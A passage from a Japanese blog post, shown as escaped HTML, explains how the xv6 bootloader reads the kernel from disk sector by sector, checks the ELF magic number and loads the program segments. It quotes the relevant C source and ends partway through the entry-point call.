&lt;p&gt;内部の処理では、&lt;code class=&quot;language-text&quot;&gt;readsect&lt;/code&gt;関数によって2番目のセクタ(セクタ1)から、4096バイト分のデータを1セクタずつディスクから読み込み、&lt;code class=&quot;language-text&quot;&gt;uchar* pa&lt;/code&gt;の領域に書き込んでいきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Read &apos;count&apos; bytes at &apos;offset&apos; from kernel into physical address &apos;pa&apos;.&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// Might copy more than asked.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;readseg&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; pa&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; uint count&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; uint offset&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; epa&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  epa &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; pa &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; count&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Round down to sector boundary.&lt;/span&gt;
  pa &lt;span class=&quot;token operator&quot;&gt;-=&lt;/span&gt; offset &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; SECTSIZE&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  
  &lt;span class=&quot;token comment&quot;&gt;// Translate from bytes to sectors; kernel starts at sector 1.&lt;/span&gt;
  offset &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;offset &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; SECTSIZE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// If this is too slow, we could read lots of sectors at a time.&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// We&apos;d write more to memory than asked, but it doesn&apos;t matter --&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// we load in increasing order.&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; pa &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; epa&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; pa &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; SECTSIZE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; offset&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;readsect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pa&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; offset&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;こちらが&lt;code class=&quot;language-text&quot;&gt;readsect&lt;/code&gt;関数です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Read a single sector at offset into dst.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;readsect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;dst&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; uint offset&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// Issue command.&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;waitdisk&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x1F2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;// count = 1&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x1F3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; offset&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x1F4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; offset &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x1F5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; offset &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x1F6&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;offset &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xE0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x1F7&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// cmd 0x20 - read sectors&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Read data.&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;waitdisk&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;insl&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x1F0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; dst&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; SECTSIZE&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;このようなディスクの呼び出しは&lt;code class=&quot;language-text&quot;&gt;Cylinder-head-sector(CHS)&lt;/code&gt;と呼ばれる方法を使用しています。&lt;/p&gt;
&lt;p&gt;昨今のOSでこのようなディスク読み出しを実装しているものは(おそらく)無いのでCHSの詳細については割愛します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://en.wikipedia.org/wiki/Cylinder-head-sector&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Cylinder-head-sector - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/61028931/xv6-boot-loader-reading-sectors-off-disk-using-chs&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;c - xv6 boot loader: Reading sectors off disk using CHS - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ここでなぜ&lt;code class=&quot;language-text&quot;&gt;offset = (offset / SECTSIZE) + 1;&lt;/code&gt;の行で、2番目のセクタ(セクタ1)からデータを読み込んでいるのかというと、Makefileの項で確認した通り、カーネルプログラムはイメージの先頭512バイトの位置に配置されているためです。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/0ee723f0df4390ef428db10febeb6cfd/0b533/image-8-16455921223972.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAARlAAAEZQAGA43XUAAABiElEQVQ4y8WU6XaCMBBGff8Hah+gdtGiApGqaCsgFgmgHDZ3viZxpaL1X3POPWFmwiXDVsF+bLdbRFFUII5jJEki4Me/65vNRpyb5/lBg0oQ+IjY4vVqhW9KQcwRNMsWEMNCo9dHUx+ADM1Tnq2xnAm2ZcLlcon1es12uIE9cVHTh3gfGJAGJl47AzxUa3h8qeNZ0yF9mixviDXDsYOcdXUhxNlwPAeNLxmyQRiqmMlIEygmQWufaw5lGI5ZLuTBIeGHFF0qo+8T6B5HFce7WN3nCHqeAtszWcsn4YGC0Ju5+JjI6LkEXVdlEKijBhRLOsacjsuEtCgstHwhpDshn+t6FW/dp13MZL0rwuMOC8LQFYt1ry1knL6vCQ4xr3WpgrFnYZ4tQKmLsW0jCKbgD7ggpNMJa1GCNm6hfaS5ZxfzGrElWK7BdpjfbjlOYqTzBOkiZSTlsHrG6mE4E6/bzZazbI57B/96zoWlO8yyrHC1a4hu+Nf1L8J7x13CNE3FveHzX1z72/wARuV7fAc3xmkAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/0ee723f0df4390ef428db10febeb6cfd/8ac56/image-8-16455921223972.webp 240w,
/static/0ee723f0df4390ef428db10febeb6cfd/d3be9/image-8-16455921223972.webp 480w,
/static/0ee723f0df4390ef428db10febeb6cfd/b0a15/image-8-16455921223972.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/0ee723f0df4390ef428db10febeb6cfd/8ff5a/image-8-16455921223972.png 240w,
/static/0ee723f0df4390ef428db10febeb6cfd/e85cb/image-8-16455921223972.png 480w,
/static/0ee723f0df4390ef428db10febeb6cfd/0b533/image-8-16455921223972.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/0ee723f0df4390ef428db10febeb6cfd/0b533/image-8-16455921223972.png&quot;
            alt=&quot;img&quot;
            title=&quot;img&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;xv6OSでは、&lt;code class=&quot;language-text&quot;&gt;\#define SECTSIZE  512&lt;/code&gt;とある通り、1セクタ分のサイズが512バイトと定義されています。&lt;/p&gt;
&lt;p&gt;そのため、2セクタ目の先頭にはカーネルの先頭バイトが存在していることが期待されます。&lt;/p&gt;
&lt;h3 id=&quot;読み込んだカーネルの確認&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E8%AA%AD%E3%81%BF%E8%BE%BC%E3%82%93%E3%81%A0%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%81%AE%E7%A2%BA%E8%AA%8D&quot; aria-label=&quot;読み込んだカーネルの確認 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;読み込んだカーネルの確認&lt;/h3&gt;
&lt;p&gt;次の処理では、カーネルが正常に読み込まれているか確認するため、マジックナンバを参照しています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Is this an ELF executable?&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;elf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;magic &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; ELF_MAGIC&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// let bootasm.S handle error&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;プログラムヘッダの読み込み&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%83%98%E3%83%83%E3%83%80%E3%81%AE%E8%AA%AD%E3%81%BF%E8%BE%BC%E3%81%BF&quot; aria-label=&quot;プログラムヘッダの読み込み permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;プログラムヘッダの読み込み&lt;/h3&gt;
&lt;p&gt;続いて、プログラムヘッダを読み込みます。&lt;/p&gt;
&lt;p&gt;基本的にはカーネルを読み込んだ際とほとんど同じ挙動のようです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Load each program segment (ignores ph flags).&lt;/span&gt;
ph &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;proghdr&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;elf &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; elf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;phoff&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
eph &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; ph &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; elf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;phnum&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; ph &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; eph&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  pa &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;paddr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;readseg&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pa&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;filesz&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;off&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;memsz &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;filesz&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;stosb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pa &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;filesz&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;memsz &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;filesz&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;まず、&lt;code class=&quot;language-text&quot;&gt;(uchar*)elf + elf-&gt;phoff&lt;/code&gt;のアドレスを&lt;code class=&quot;language-text&quot;&gt;proghdr&lt;/code&gt;構造体としてキャストします。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;(uchar*)elf + elf-&gt;phoff&lt;/code&gt;はプログラムヘッダの開始オフセットです。&lt;/p&gt;
&lt;p&gt;先ほど4096バイト分のデータを読み込んだことで、ELFヘッダとともにプログラムヘッダもすべて読み込まれていることが期待されているため、&lt;code class=&quot;language-text&quot;&gt;(uchar*)elf + elf-&gt;phoff&lt;/code&gt;の位置にはすでにプログラムヘッダの情報が格納されています。&lt;/p&gt;
&lt;p&gt;ここから、各プログラムセグメントのデータをロードします。&lt;/p&gt;
&lt;p&gt;この処理によって、実際に実行されるプログラムがロードされます。&lt;/p&gt;
&lt;p&gt;なお、&lt;code class=&quot;language-text&quot;&gt;stosb&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;x86.h&lt;/code&gt;で定義されており、&lt;code class=&quot;language-text&quot;&gt;ph-&gt;memsz&lt;/code&gt;が&lt;code class=&quot;language-text&quot;&gt;ph-&gt;filesz&lt;/code&gt;よりも大きい場合に0埋めするために利用されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;inline&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;stosb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;addr&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; cnt&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;asm&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;volatile&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;cld; rep stosb&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
               &lt;span class=&quot;token string&quot;&gt;&quot;=D&quot;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;addr&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;=c&quot;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cnt&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
               &lt;span class=&quot;token string&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;addr&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cnt&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;a&quot;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
               &lt;span class=&quot;token string&quot;&gt;&quot;memory&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;cc&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/27958743/difference-between-p-filesz-and-p-memsz-of-elf32-phdr/31011428#31011428&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;elf - Difference between p&lt;em&gt;filesz and p&lt;/em&gt;memsz of Elf32_Phdr - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;これでディスクからカーネルプログラムを読み込むことができたので、以降の処理はカーネルに任せることとなります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Call the entry point from the ELF header.&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// Does not return!&lt;/span&gt;
entry &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;elf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;entry&lt;span class=&quot;token 